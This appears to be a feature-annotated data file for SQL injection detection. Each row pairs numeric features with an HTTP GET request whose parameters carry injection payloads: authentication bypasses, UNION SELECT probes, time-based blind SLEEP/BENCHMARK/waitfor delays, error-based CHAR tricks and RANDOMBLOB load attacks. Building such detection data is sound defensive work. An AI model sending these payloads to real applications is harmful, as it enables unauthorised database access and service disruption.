91,1,200,7908,30,8,13,1,1,GET ?password= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14 HTTP/1.1
91,1,200,3901,30,8,13,1,1,GET ?password= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14 HTTP/1.1
91,1,200,2171,30,8,13,1,1,GET ?password= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14 HTTP/1.1
93,2,200,6113,33,7,10,1,1,GET ?name= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11#&tel= ORDER BY 1_SLEEP(5)_3_4--  HTTP/1.1
39,1,200,5770,19,7,5,1,1,GET ?account=ORDER BY SLEEP(5) HTTP/1.1
39,1,200,4870,19,7,5,1,1,GET ?account=ORDER BY SLEEP(5) HTTP/1.1
20,1,200,5213,7,2,5,2,1,GET ?id='/* HTTP/1.1
20,1,200,5534,7,2,5,2,1,GET ?id='/* HTTP/1.1
20,1,200,1206,7,2,5,2,1,GET ?id='/* HTTP/1.1
20,1,200,6831,7,2,5,2,1,GET ?id='/* HTTP/1.1
20,1,200,2153,7,2,5,2,1,GET ?id='/* HTTP/1.1
175,2,200,7214,80,6,36,1,1,GET ?id= OR 1=0-- &pass= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75)))# HTTP/1.1
159,2,200,6048,31,18,16,1,1,GET ?account=1 or sleep(5)#&pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28 HTTP/1.1
137,2,200,5121,47,11,20,1,1,GET ?account= AS INJECTX WHERE 1=1 AND 1=0--&pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17# HTTP/1.1
28,1,200,2544,7,6,6,1,1,GET ?pass= or 1=1-- HTTP/1.1
28,1,200,6047,7,6,6,1,1,GET ?pass= or 1=1-- HTTP/1.1
28,1,200,3742,7,6,6,1,1,GET ?pass= or 1=1-- HTTP/1.1
28,1,200,7695,7,6,6,1,1,GET ?pass= or 1=1-- HTTP/1.1
28,1,200,4718,7,6,6,1,1,GET ?pass= or 1=1-- HTTP/1.1
28,1,200,5661,7,6,6,1,1,GET ?pass= or 1=1-- HTTP/1.1
51,1,200,6465,21,5,3,1,1,GET ?email= UNION ALL SELECT 1_2_3_4_5_6_7 HTTP/1.1
51,1,200,7182,21,5,3,1,1,GET ?email= UNION ALL SELECT 1_2_3_4_5_6_7 HTTP/1.1
51,1,200,5727,21,5,3,1,1,GET ?email= UNION ALL SELECT 1_2_3_4_5_6_7 HTTP/1.1
51,1,200,4535,21,5,3,1,1,GET ?email= UNION ALL SELECT 1_2_3_4_5_6_7 HTTP/1.1
208,2,200,7239,121,18,25,1,1,GET ?account=') or sleep(5)='&pass= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
141,2,200,1754,54,7,23,1,1,GET ?tel= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13&name= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5 HTTP/1.1
62,1,200,5241,7,40,5,1,1,GET ?email=select session_user from sysibm.sysdummy1; HTTP/1.1
62,1,200,1888,7,40,5,1,1,GET ?email=select session_user from sysibm.sysdummy1; HTTP/1.1
62,1,200,5452,7,40,5,1,1,GET ?email=select session_user from sysibm.sysdummy1; HTTP/1.1
62,1,200,4720,7,40,5,1,1,GET ?email=select session_user from sysibm.sysdummy1; HTTP/1.1
62,1,200,3515,7,40,5,1,1,GET ?email=select session_user from sysibm.sysdummy1; HTTP/1.1
62,1,200,2781,7,40,5,1,1,GET ?email=select session_user from sysibm.sysdummy1; HTTP/1.1
62,1,200,5247,7,40,5,1,1,GET ?email=select session_user from sysibm.sysdummy1; HTTP/1.1
124,2,200,7282,65,13,24,1,1,GET ?username= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88)))-- &pass=AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)# HTTP/1.1
211,2,200,3864,101,7,39,1,1,GET ?name= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10#&tel= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88)))--  HTTP/1.1
50,1,200,3884,25,8,7,1,1,GET ?username= UNION ALL SELECT USER()--  HTTP/1.1
50,1,200,2151,25,8,7,1,1,GET ?username= UNION ALL SELECT USER()--  HTTP/1.1
140,2,200,7965,31,14,18,1,1,GET ?username=' or '1′='1&pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22# HTTP/1.1
220,2,200,2699,101,8,42,1,1,GET ?mail= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113)))-- &pass= ORDER BY 12  HTTP/1.1
40,1,200,1259,19,4,6,1,1,GET ?mail= ORDER BY 1_SLEEP(5)# HTTP/1.1
40,1,200,4031,19,4,6,1,1,GET ?mail= ORDER BY 1_SLEEP(5)# HTTP/1.1
40,1,200,3100,19,4,6,1,1,GET ?mail= ORDER BY 1_SLEEP(5)# HTTP/1.1
40,1,200,4538,19,4,6,1,1,GET ?mail= ORDER BY 1_SLEEP(5)# HTTP/1.1
40,1,200,4727,19,4,6,1,1,GET ?mail= ORDER BY 1_SLEEP(5)# HTTP/1.1
42,1,200,7928,19,8,7,1,1,GET ?username=ORDER BY SLEEP(5)-- HTTP/1.1
42,1,200,5915,19,8,7,1,1,GET ?username=ORDER BY SLEEP(5)-- HTTP/1.1
42,1,200,5113,19,8,7,1,1,GET ?username=ORDER BY SLEEP(5)-- HTTP/1.1
42,1,200,4872,19,8,7,1,1,GET ?username=ORDER BY SLEEP(5)-- HTTP/1.1
42,1,200,4927,19,8,7,1,1,GET ?username=ORDER BY SLEEP(5)-- HTTP/1.1
42,1,200,1216,19,8,7,1,1,GET ?username=ORDER BY SLEEP(5)-- HTTP/1.1
42,1,200,7597,19,8,7,1,1,GET ?username=ORDER BY SLEEP(5)-- HTTP/1.1
41,1,200,5770,19,5,6,1,1,GET ?phone= ORDER BY 1_SLEEP(5)# HTTP/1.1
41,1,200,6894,19,5,6,1,1,GET ?phone= ORDER BY 1_SLEEP(5)# HTTP/1.1
41,1,200,7574,19,5,6,1,1,GET ?phone= ORDER BY 1_SLEEP(5)# HTTP/1.1
196,2,200,7962,76,23,39,1,1,GET ?username=')) or benchmark(10000000_MD5(1))#&pass= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80)))# HTTP/1.1
52,2,200,2034,7,16,10,2,1,GET ?name= or 1=1/*&tel=admin" or "1"="1"-- HTTP/1.1
49,2,200,3246,14,9,11,1,1,GET ?name=%' or '0'='0&tel= ORDER BY 22  HTTP/1.1
44,1,200,4931,17,5,5,2,1,GET ?email=RANDOMBLOB(1000000000/2) HTTP/1.1
44,1,200,3835,17,5,5,2,1,GET ?email=RANDOMBLOB(1000000000/2) HTTP/1.1
44,1,200,5933,17,5,5,2,1,GET ?email=RANDOMBLOB(1000000000/2) HTTP/1.1
44,1,200,4923,17,5,5,2,1,GET ?email=RANDOMBLOB(1000000000/2) HTTP/1.1
44,1,200,6237,17,5,5,2,1,GET ?email=RANDOMBLOB(1000000000/2) HTTP/1.1
44,1,200,1117,17,5,5,2,1,GET ?email=RANDOMBLOB(1000000000/2) HTTP/1.1
44,1,200,3587,17,5,5,2,1,GET ?email=RANDOMBLOB(1000000000/2) HTTP/1.1
44,1,200,7409,17,5,5,2,1,GET ?email=RANDOMBLOB(1000000000/2) HTTP/1.1
32,2,200,2801,7,9,4,2,1,GET login/?id=" or ""&" HTTP/1.1
32,2,200,7154,7,9,4,2,1,GET login/?id=" or ""&" HTTP/1.1
32,2,200,3778,7,9,4,2,1,GET login/?id=" or ""&" HTTP/1.1
32,2,200,7276,7,9,4,2,1,GET login/?id=" or ""&" HTTP/1.1
32,2,200,6358,7,9,4,2,1,GET login/?id=" or ""&" HTTP/1.1
32,2,200,2556,7,9,4,2,1,GET login/?id=" or ""&" HTTP/1.1
32,2,200,7023,7,9,4,2,1,GET login/?id=" or ""&" HTTP/1.1
32,2,200,5491,7,9,4,2,1,GET login/?id=" or ""&" HTTP/1.1
65,1,200,4750,30,4,15,1,1,GET ?pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4--  HTTP/1.1
65,1,200,5785,30,4,15,1,1,GET ?pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4--  HTTP/1.1
65,1,200,5048,30,4,15,1,1,GET ?pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4--  HTTP/1.1
65,1,200,3130,30,4,15,1,1,GET ?pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4--  HTTP/1.1
96,2,200,3505,31,11,17,1,1,GET ?phone="or 1=1 or ""="&id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6--  HTTP/1.1
38,2,200,3415,7,13,11,1,1,GET ?name=' or 'x'='x&phone=' HTTP/1.1
158,1,200,1283,46,2,16,1,1,GET ?id= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30# HTTP/1.1
158,1,200,6903,46,2,16,1,1,GET ?id= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30# HTTP/1.1
158,1,200,3260,46,2,16,1,1,GET ?id= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30# HTTP/1.1
40,1,200,5301,7,12,7,1,1,GET ?email=admin") or ("1"="1"# HTTP/1.1
40,1,200,1406,7,12,7,1,1,GET ?email=admin") or ("1"="1"# HTTP/1.1
40,1,200,5483,7,12,7,1,1,GET ?email=admin") or ("1"="1"# HTTP/1.1
40,1,200,4396,7,12,7,1,1,GET ?email=admin") or ("1"="1"# HTTP/1.1
40,1,200,3287,7,12,7,1,1,GET ?email=admin") or ("1"="1"# HTTP/1.1
40,1,200,5851,7,12,7,1,1,GET ?email=admin") or ("1"="1"# HTTP/1.1
40,1,200,5272,7,12,7,1,1,GET ?email=admin") or ("1"="1"# HTTP/1.1
40,1,200,7025,7,12,7,1,1,GET ?email=admin") or ("1"="1"# HTTP/1.1
40,1,200,7172,7,12,7,1,1,GET ?email=admin") or ("1"="1"# HTTP/1.1
40,1,200,5506,7,12,7,1,1,GET ?email=admin") or ("1"="1"# HTTP/1.1
54,2,200,2722,7,19,9,1,1,GET ?name=admin" or "1"="1"--&phone= and 1=1– HTTP/1.1
158,2,200,7218,60,21,31,1,1,GET ?email=")) or benchmark(10000000_MD5(1))#&phone= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88) CHAR(88) CHAR(88) CHAR(88) CHAR(88)))--  HTTP/1.1
136,1,200,2106,30,5,13,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30 HTTP/1.1
136,1,200,2328,30,5,13,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30 HTTP/1.1
136,1,200,3215,30,5,13,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30 HTTP/1.1
136,1,200,1241,30,5,13,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30 HTTP/1.1
136,1,200,1963,30,5,13,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30 HTTP/1.1
135,2,200,7505,46,14,19,2,1,GET ?username=or 1=1/*&pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16 HTTP/1.1
165,2,200,7027,31,15,16,2,1,GET ?mail=admin" or "1"="1"/*&pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29# HTTP/1.1
50,2,200,6981,13,9,13,1,1,GET ?phone=' or 1=1&id= AND 1=1 AND '%'=' HTTP/1.1
143,1,200,4181,31,2,13,1,1,GET ?id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30--  HTTP/1.1
143,1,200,7915,31,2,13,1,1,GET ?id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30--  HTTP/1.1
143,1,200,2188,31,2,13,1,1,GET ?id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30--  HTTP/1.1
143,1,200,5892,31,2,13,1,1,GET ?id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30--  HTTP/1.1
143,1,200,4431,31,2,13,1,1,GET ?id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30--  HTTP/1.1
46,1,200,1835,7,19,7,1,1,GET ?account=waitfor delay '00:00:05' HTTP/1.1
46,1,200,4287,7,19,7,1,1,GET ?account=waitfor delay '00:00:05' HTTP/1.1
46,1,200,4388,7,19,7,1,1,GET ?account=waitfor delay '00:00:05' HTTP/1.1
46,1,200,3990,7,19,7,1,1,GET ?account=waitfor delay '00:00:05' HTTP/1.1
46,1,200,7254,7,19,7,1,1,GET ?account=waitfor delay '00:00:05' HTTP/1.1
46,1,200,1810,7,19,7,1,1,GET ?account=waitfor delay '00:00:05' HTTP/1.1
46,1,200,2295,7,19,7,1,1,GET ?account=waitfor delay '00:00:05' HTTP/1.1
46,1,200,3329,7,19,7,1,1,GET ?account=waitfor delay '00:00:05' HTTP/1.1
54,2,200,2030,14,9,16,1,1,GET ?phone=') or ('1'='1--&id= ORDER BY 12--  HTTP/1.1
132,2,200,2422,32,7,9,1,1,GET ?tel=-1' UNION SELECT 1_2_3-- &name= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25 HTTP/1.1
45,2,200,5401,21,4,6,1,1,GET ?id= UNION ALL SELECT 1_2_3&id=' HTTP/1.1
121,1,200,2297,30,2,13,1,1,GET ?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26 HTTP/1.1
121,1,200,4684,30,2,13,1,1,GET ?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26 HTTP/1.1
112,2,200,5266,30,19,18,2,1,GET ?username=admin' or 1=1/*&pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14 HTTP/1.1
294,2,200,6933,70,11,27,1,1,GET ?account= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30-- &pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30 HTTP/1.1
33,1,200,1594,12,8,5,1,1,GET ?code=or pg_SLEEP(5) HTTP/1.1
33,1,200,1001,12,8,5,1,1,GET ?code=or pg_SLEEP(5) HTTP/1.1
33,1,200,1338,12,8,5,1,1,GET ?code=or pg_SLEEP(5) HTTP/1.1
33,1,200,5565,12,8,5,1,1,GET ?code=or pg_SLEEP(5) HTTP/1.1
33,1,200,6666,12,8,5,1,1,GET ?code=or pg_SLEEP(5) HTTP/1.1
105,2,200,5521,31,15,16,1,1,GET ?name= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12#&phone=or true-- HTTP/1.1
228,2,200,1933,149,9,22,1,1,GET ?email='*'&pass= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
77,4,200,1094,13,32,19,1,1,GET ?tel= and (select substring(@@version_1_1))='M'&name=&&SLEEP(5)# HTTP/1.1
77,1,200,5121,31,5,13,1,1,GET ?phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6--  HTTP/1.1
77,1,200,4580,31,5,13,1,1,GET ?phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6--  HTTP/1.1
77,1,200,2840,31,5,13,1,1,GET ?phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6--  HTTP/1.1
77,1,200,2162,31,5,13,1,1,GET ?phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6--  HTTP/1.1
77,1,200,2913,31,5,13,1,1,GET ?phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6--  HTTP/1.1
51,1,200,6863,17,8,9,1,1,GET ?user= AND 7300=7300 AND ('pKlZ'='pKlZ HTTP/1.1
112,2,200,5982,30,11,20,1,1,GET ?email=' or 1=1#&pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16--  HTTP/1.1
56,2,200,2722,7,18,13,1,1,GET ?name=admin") or "1"="1"--&phone=' or 1=1-- HTTP/1.1
185,2,200,5056,105,10,24,1,1,GET ?mail= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL-- &pass=") or ("1"="1"-- HTTP/1.1
114,2,200,5299,31,15,16,1,1,GET ?code=admin' or 1=1&code= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14# HTTP/1.1
114,2,200,4770,21,12,10,1,1,GET ?id= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23&id=' or 'one'='one– HTTP/1.1
139,2,200,1310,50,37,23,1,1,GET ?email= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88) CHAR(88) CHAR(88)))-- &phone=select * from master..sysserverse HTTP/1.1
30,1,200,7768,7,8,4,1,1,GET ?pass=" or "x"="x HTTP/1.1
30,1,200,5078,7,8,4,1,1,GET ?pass=" or "x"="x HTTP/1.1
30,1,200,7539,7,8,4,1,1,GET ?pass=" or "x"="x HTTP/1.1
30,1,200,1387,7,8,4,1,1,GET ?pass=" or "x"="x HTTP/1.1
30,1,200,2500,7,8,4,1,1,GET ?pass=" or "x"="x HTTP/1.1
30,1,200,3315,7,8,4,1,1,GET ?pass=" or "x"="x HTTP/1.1
30,1,200,2449,7,8,4,1,1,GET ?pass=" or "x"="x HTTP/1.1
30,1,200,1282,7,8,4,1,1,GET ?pass=" or "x"="x HTTP/1.1
30,1,200,4185,7,8,4,1,1,GET ?pass=" or "x"="x HTTP/1.1
30,1,200,4557,7,8,4,1,1,GET ?pass=" or "x"="x HTTP/1.1
30,1,200,3893,7,8,4,1,1,GET ?pass=" or "x"="x HTTP/1.1
30,1,200,6112,7,8,4,1,1,GET ?pass=" or "x"="x HTTP/1.1
30,1,200,3421,7,8,4,1,1,GET ?pass=" or "x"="x HTTP/1.1
30,1,200,4786,7,8,4,1,1,GET ?pass=" or "x"="x HTTP/1.1
30,1,200,5359,7,8,4,1,1,GET ?pass=" or "x"="x HTTP/1.1
70,2,200,3152,26,9,7,1,1,GET ?tel= UNION ALL SELECT 1_2_3_4_5_6_7_8_9&name=pg_SLEEP(5) HTTP/1.1
162,2,200,7074,37,4,19,1,1,GET ?id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30&id= AND 1=0 AND '%'=' HTTP/1.1
229,2,200,4104,104,6,47,1,1,GET ?id= HAVING 1=0-- &pass= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112)))--  HTTP/1.1
34,1,200,1812,14,4,5,1,1,GET ?user= ORDER BY 18--  HTTP/1.1
34,1,200,2207,14,4,5,1,1,GET ?user= ORDER BY 18--  HTTP/1.1
34,1,200,3751,14,4,5,1,1,GET ?user= ORDER BY 18--  HTTP/1.1
34,1,200,6645,14,4,5,1,1,GET ?user= ORDER BY 18--  HTTP/1.1
58,1,200,2413,30,4,10,1,1,GET ?pass= UNION SELECT @@VERSION_SLEEP(5)_"'3'"# HTTP/1.1
58,1,200,4861,30,4,10,1,1,GET ?pass= UNION SELECT @@VERSION_SLEEP(5)_"'3'"# HTTP/1.1
58,1,200,1353,30,4,10,1,1,GET ?pass= UNION SELECT @@VERSION_SLEEP(5)_"'3'"# HTTP/1.1
58,1,200,4820,30,4,10,1,1,GET ?pass= UNION SELECT @@VERSION_SLEEP(5)_"'3'"# HTTP/1.1
58,1,200,2845,30,4,10,1,1,GET ?pass= UNION SELECT @@VERSION_SLEEP(5)_"'3'"# HTTP/1.1
58,1,200,6946,30,4,10,1,1,GET ?pass= UNION SELECT @@VERSION_SLEEP(5)_"'3'"# HTTP/1.1
31,1,200,6311,14,2,5,1,1,GET ?id= ORDER BY 6--  HTTP/1.1
31,1,200,7872,14,2,5,1,1,GET ?id= ORDER BY 6--  HTTP/1.1
104,1,200,6056,30,5,14,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19# HTTP/1.1
104,1,200,1126,30,5,14,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19# HTTP/1.1
104,1,200,7684,30,5,14,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19# HTTP/1.1
104,1,200,2525,30,5,14,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19# HTTP/1.1
104,1,200,3816,30,5,14,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19# HTTP/1.1
30,1,200,4805,7,7,7,1,1,GET ?email=' or 1=1-- HTTP/1.1
30,1,200,5278,7,7,7,1,1,GET ?email=' or 1=1-- HTTP/1.1
30,1,200,3312,7,7,7,1,1,GET ?email=' or 1=1-- HTTP/1.1
30,1,200,1730,7,7,7,1,1,GET ?email=' or 1=1-- HTTP/1.1
30,1,200,1815,7,7,7,1,1,GET ?email=' or 1=1-- HTTP/1.1
30,1,200,7129,7,7,7,1,1,GET ?email=' or 1=1-- HTTP/1.1
30,1,200,1573,7,7,7,1,1,GET ?email=' or 1=1-- HTTP/1.1
30,1,200,5522,7,7,7,1,1,GET ?email=' or 1=1-- HTTP/1.1
30,1,200,3846,7,7,7,1,1,GET ?email=' or 1=1-- HTTP/1.1
30,1,200,3305,7,7,7,1,1,GET ?email=' or 1=1-- HTTP/1.1
30,1,200,5306,7,7,7,1,1,GET ?email=' or 1=1-- HTTP/1.1
30,1,200,1573,7,7,7,1,1,GET ?email=' or 1=1-- HTTP/1.1
59,2,200,4258,7,22,16,1,1,GET ?code=' or 1=1&code=');waitfor delay '0:0:5'-- HTTP/1.1
90,2,200,4997,40,9,17,2,1,GET ?name= OR x=y&tel=OR 2947=LIKE('ABCDEFG'_UPPER(HEX(RANDOMBLOB(500000000/2)))) HTTP/1.1
148,1,200,5757,46,4,16,1,1,GET ?mail= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26# HTTP/1.1
49,2,200,5163,9,8,13,1,1,GET ?id=") or ("1"="1"--&pass= OR 1=1--  HTTP/1.1
102,2,200,7356,42,14,17,2,1,GET ?name= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88)))#&tel=admin" or "1"="1"/* HTTP/1.1
54,2,200,6333,19,14,9,1,1,GET ?username=or SLEEP(5)='&pass= ORDER BY 9  HTTP/1.1
145,2,200,1270,36,9,18,1,1,GET ?name=SLEEP(5)='&phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25# HTTP/1.1
188,2,200,5260,57,13,22,1,1,GET ?name= OR 3409=3409 AND ('pytW' LIKE 'pytY&tel= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26 HTTP/1.1
